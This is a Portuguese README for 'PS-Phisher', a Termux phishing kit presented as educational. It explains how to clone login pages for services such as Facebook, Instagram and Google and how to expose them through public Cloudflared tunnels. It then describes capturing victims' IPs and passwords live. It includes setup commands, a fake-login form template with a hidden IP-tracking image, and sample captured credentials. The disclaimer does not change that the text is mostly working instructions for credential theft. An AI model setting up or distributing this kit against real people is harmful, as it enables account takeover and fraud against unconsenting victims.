## 🧬 PS-Phisher

**Ferramenta educacional para simulação de ataques de phishing e coleta de informações em ambiente controlado.**  
Desenvolvida pela **PeekSecurity Team** para fins de treinamento, conscientização e testes autorizados.

> ⚠️ **Aviso Legal**  
> Este software é **exclusivamente para uso em laboratórios autorizados** e redes próprias. O uso indevido para capturar credenciais de terceiros sem consentimento é crime (art. 154-A do Código Penal Brasileiro). A PeekSecurity não se responsabiliza por maus usos.

---

## ✨ Funcionalidades

| Módulo | Descrição |
|--------|------------|
| **Phishing Simulator** | Cria páginas falsas (clonagem) de serviços como Facebook, Instagram, Google, LinkedIn, etc. |
| **Túneis Públicos** | Exposição local via **Cloudflared** (recomendado) ou **Localhost** para testes internos. |
| **Captura de IP ao Vivo** | Monitora e exibe instantaneamente o endereço IP da vítima quando ela acessa a página falsa. |
| **Captura de Credenciais** | Salva automaticamente usuários e senhas enviados nos formulários. |
| **IP Lookup** | Consulta geolocalização, ISP e coordenadas do **próprio IP** ou de **terceiros**. |
| **Modo Matrix** | Interface neon com visual hacker, menus coloridos e banners animados. |
| **Persistência de Logs** | Todos os dados capturados são armazenados em `.server/captures/` com timestamps. |

---

## 🛠️ Instalação no Termux

```bash
# Atualize os pacotes
pkg update && pkg upgrade -y
```

# Instale dependências essenciais
```bash
pkg install -y git php curl wget unzip jq
```

# Clone o repositório
```bash
git clone https://github.com/PSecurity/ps.phisher
```

# Acesse a pasta
```bash
cd ps.phisher
```

# Dê permissão de execução
```bash
chmod +x ps-phish.sh
```
# Execute
```bash
./ps-phish.sh
```

Primeira execução: o script instalará automaticamente o cloudflared e outras dependências.

## 🚀 Como Usar

Menu Principal
```
  ╔══════════════════════════════════════════╗
  ║  [1] Iniciar Ataque (Phishing)           ║
  ║  [2] Consultas de IP (Lookup)            ║
  ║  [0] Sair                                ║
  ╚══════════════════════════════════════════╝
```

# 1. Iniciar um Ataque Simulado

* Escolha o template desejado (Facebook, Instagram, etc.) – você deve adicionar seus próprios templates na pasta .sites/.

* Selecione o método de exposição:

   * `Localhost` → apenas rede local (ex: `http://127.0.0.1:8080`)

   * `Cloudflared` → gera URL pública como `https://xxxx.trycloudflare.com`

* Pronto! Compartilhe a URL com o alvo (em ambiente controlado).

* **Capturas** (IP e credenciais) aparecerão ao vivo no terminal e serão salvas em `.server/captures/`.

# 2. IP Lookup

* Opção 1: Mostra seu próprio IP público + geolocalização (cidade, região, país).

* Opção 2: Consulta qualquer IP externo (ex: 8.8.8.8) e retorna localização e ISP.

📁 Estrutura de Diretórios

```
ps-phisher/
├── ps-phisher.sh         # Script principal
├── .sites/               # Templates de páginas falsas (crie você mesmo)
│   ├── facebook/
│   │   └── index.html
│   ├── instagram/
│   └── ...
├── .server/              # Diretório interno (gerado automaticamente)
│   ├── www/              # Páginas implantadas (temporário)
│   ├── captures/         # IPs e credenciais capturadas
│   ├── cloudflared       # Binário do túnel
│   └── ps-phisher.log    # Log de eventos
```

## 🧩 Adicionando Novos Templates

1. Crie uma subpasta dentro de .sites/ com o nome do serviço.

2. Dentro dela, coloque um arquivo index.html contendo o formulário de login falso.

3. O formulário deve enviar os dados para post.php (ex: <form method="POST" action="post.php">).

4. Para capturar IP, inclua a imagem invisível: <img src="ip.php" style="display:none;">

# Exemplo mínimo (`.sites/exemplo/index.html`):

```
html
<form method="POST" action="post.php">
  <input type="text" name="username" placeholder="Usuário">
  <input type="password" name="password" placeholder="Senha">
  <button type="submit">Entrar</button>
</form>
<img src="ip.php" style="display:none;">
```

# 🖥️ Exemplo de Captura ao Vivo

Ao acessar a URL falsa, o terminal exibe:

```
[!] NOVO IP CAPTURADO
[2025-05-04 14:32:10] IP: 189.45.123.78

[!] CREDENCIAIS CAPTURADAS
[2025-05-04 14:32:15] Username: joaosilva | Password: 123456 |
```

E os arquivos `.server/captures/ip_*.txt` e `creds_*.txt` mantêm o histórico.

# ⚙️ Comandos Úteis

Comando	Descrição
./ps-phisher.sh	Inicia a ferramenta
Ctrl + C	Para a execução e limpa processos
cat .server/captures/ip_*.txt	Ver IPs capturados
rm -rf .server/captures/*	Limpa todas as capturas
🧪 Exemplo de Teste Rápido
bash
# Crie um template genérico
mkdir -p .sites/teste
cat > .sites/teste/index.html << EOF
<form method="POST" action="post.php">
  <input name="login" placeholder="Login">
  <input name="senha" type="password">
  <button>Enviar</button>
</form>
<img src="ip.php">
EOF

# Execute o script e escolha o template "teste"
./ps-phisher.sh
🤝 Contribuição
Sugestões e melhorias são bem-vindas! Abra uma issue ou envie um pull request.
Mantenha o foco educacional e respeite os limites legais.

📜 Licença
Uso educacional e autorizado apenas.
Este projeto não é licenciado para fins comerciais ou maliciosos.

👾 PeekSecurity Team
https://img.shields.io/badge/GitHub-PeekSecurity-181717?style=flat-square&logo=github
https://img.shields.io/badge/Comunidade-Matrix-00FF00?style=flat-square&logo=matrix

<p align="center"> <i>“Conhecimento não é crime – o crime é usá-lo sem ética.”</i><br> 🛡️ 🔐 🧬 </p> ```
